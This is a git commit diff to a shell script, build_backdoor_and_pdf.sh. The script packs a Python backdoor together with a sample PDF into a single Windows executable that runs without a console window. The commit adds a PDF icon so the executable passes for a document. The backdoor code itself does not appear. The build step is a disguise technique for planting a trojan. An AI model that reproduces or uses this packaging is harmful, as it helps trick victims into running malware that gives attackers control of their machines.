66c29361c3e132949c8e5e89df42f56183e9a093
Robert Paruch <roobbb@live.com>
2020-07-17 13:55:35 -0700

    Update build_backdoor_and_pdf.sh

--- backdoor/build_backdoor_and_pdf.sh
+++ backdoor/build_backdoor_and_pdf.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 # chmod 755 build_backdoor_and_pdf.sh
 # ./build_backdoor_and_pdf.sh
-wine pyinstaller --onefile --noconsole --add-data "sample.pdf;." backdoor_and_pdf.py
+wine pyinstaller --onefile --noconsole --add-data "sample.pdf;." --icon pdf.ico backdoor_and_pdf.py
